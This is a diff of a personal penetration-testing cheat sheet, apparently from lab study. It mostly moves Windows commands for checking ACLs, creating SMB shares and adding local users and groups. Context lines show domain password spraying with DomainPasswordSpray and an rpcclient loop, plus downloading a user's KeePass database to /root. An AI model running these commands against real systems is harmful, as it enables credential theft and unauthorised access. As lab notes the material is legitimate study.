@@ -229,6 +229,12 @@ PS> powershell -command "Start-Process -Verb runas cmd"
 PS> whoami /user
 # check OS
 PS> wmic os list brief
+# check Windows Version
+PS> Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumbe
+# check alias
+PS> get-alias | sls "*ipconfig*"
+PS> Get-Alias | select -First 2
+PS> Get-Alias | Where-Object { $_.Name -like '*ipconfig*' }
 # find a specific folder
 PS> tree c:\
 PS> tree c:\ /f | more
@@ -269,6 +275,9 @@ PS> whoami /priv
 # check ACL
 PS> $sharedFolderPath = 'C:\Users\TestUser\TestShareFolder';
 PS> icacls $sharedFolderPath /inheritance:r
+PS> icacls .\"TestFolder"
+PS> icacls c:\windows
+PS> icacls c:\users
 PS> $securityGroupName = 'TestGroup'
 PS> icacls $sharedFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"
 # Service
@@ -286,6 +295,25 @@ PS> New-Item -ItemType Directory -Path .\"TestShareFolder"
 PS> New-SmbShare -Path .\ -Name "TestShareFolder"
 PS> New-SmbShare -Path c:\ -Name "TestShareFolder" -FullAccess 'Everyone'
 PS> New-SmbShare -Path C:\Users\TestUser\"TestShareFolder" -Name "TestShareFolder" -FullAccess 'Everyone'
+## Specify the shared folder path and name
+PS> $sharedFolderPath = 'C:\Users\TestUser\TestShareFolder'
+PS> $shareName = 'TestShareName'
+PS> $securityGroupName = 'TestGroup'
+## Remove the default group from the share permissions
+PS> Remove-SmbShare -Name $shareName -Force
+## Create a new shared folder with specific permissions
+PS> New-SmbShare -Path $sharedFolderPath -Name $shareName -ChangeAccess $securityGroupName -ReadAccess $securityGroupName
+## Add the security group to the existing shared folder
+### The Add-SmbShareAccess cmdlet is available on Windows Server editions and not on regular Windows client editions.
+### If you are using a Windows client version, you can use the net share and icacls commands to achieve the same result.
+PS> Add-SmbShareAccess -Name $shareName -AccountName $securityGroupName -AccessRight Change
+PS> net share $shareName=$sharedFolderPath "/grant:$securityGroupName,change"
+# Create a new local user
+PS> New-LocalUser -Name $username -Password $password -FullName 'Test' -Description 'Description of the new user' -AccountNeverExpires
+# local security group
+PS> $groupName = 'TestNewGroup'
+PS> New-LocalGroup -Name $groupName -Description 'Description of the new group'
+PS> Add-LocalGroupMember -Group $groupName -Member 'TestUser'
 # Shell
 PS> $username = 'TestUser'
 PS> $password = 'TestPassword'
@@ -392,17 +420,6 @@ download C:\\Users\\t1_trevor.jones\\Documents\\PasswordDatabase.kdbx /root
 ```
 
 
-Windows Version
-Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber
-
-File System
-NTFS
-icacls
-icacls c:\windows
-icacls c:\users
-
-
-
 $service = Get-Service -Name FoxitReaderUpdateService | Write-Output "Executable Path : $($service.PathName)"
 ... no display
 
@@ -411,51 +428,7 @@ PowerShell 6.0 以降では、ServiceController オブジェクトに UserName�
 
 $PSVersionTable.PSVersion
 
-xxxx : get-alias | sls "*ipconfig*"
-Get-Alias | select -First 2
-Get-Alias | Where-Object { $_.Name -like '*ipconfig*' }
-
 Get-ExecutionPolicy -List
-
-
-
-icacls .\"Company Data"
-
-
-# Create a new local user
-New-LocalUser -Name $username -Password $password -FullName 'Jim' -Description 'Description of the new user' -AccountNeverExpires
-
-##
-# Specify the name of the security group
-$groupName = 'HR'
-
-# Create a new local security group
-New-LocalGroup -Name $groupName -Description 'HR Department'
-
-##
-# Specify the username and group name
-$username = 'Jim'; $groupName = 'HR'; Add-LocalGroupMember -Group $groupName -Member $username
-
-
-##
-# Specify the shared folder path and name
-$sharedFolderPath = 'C:\Users\htb-student\Company Data'; $shareName = 'YourShareName'
-
-# Specify the security group name
-$securityGroupName = 'HR'
-
-# Remove the default group from the share permissions
-Remove-SmbShare -Name $shareName -Force
-
-# Create a new shared folder with specific permissions
-New-SmbShare -Path $sharedFolderPath -Name $shareName -ChangeAccess $securityGroupName -ReadAccess $securityGroupName
-
-# Add the security group to the existing shared folder
-Add-SmbShareAccess -Name $shareName -AccountName $securityGroupName -AccessRight Change
-
-I apologize for the confusion. The Add-SmbShareAccess cmdlet is available on Windows Server editions and not on regular Windows client editions. If you are using a Windows client version, you can use the net share and icacls commands to achieve the same result. 
-
-net share $shareName=$sharedFolderPath "/grant:$securityGroupName,change"
 
 
 
@@ -466,7 +439,6 @@ net share $shareName=$sharedFolderPath "/grant:$securityGroupName,change"
 # Disable inheritance before setting specific NTFS permissions
 # Set NTFS permissions using icacls
 $subFolderPath = 'C:\Users\htb-student\Company Data\HR'; $securityGroupName = 'HR'; icacls $subFolderPath /remove "Users"; icacls $subFolderPath /inheritance:r; icacls $subFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"
-
 
 # Linux Buit-In
 ```zsh
@@ -496,12 +468,9 @@ sync         x  4     65534  sync               /bin         /bin/sync
 mrb3n        x  1000  1000   mrb3n              /home/mrb3n  /bin/bash
 ```
 
-
-
 # Internal Password Spraying - from Windows
 PS > Import-Module .\DomainPasswordSpray.ps1
 PS > Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
-
 
 # BloodHound  
 ```powershell
@@ -556,7 +525,6 @@ $ echo $((16#ff0))
 4080
 $ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.0.10 | grep Authority; done
 ```
-
 
 # smbmap
 https://github.com/ShawnDEvans/smbmap  
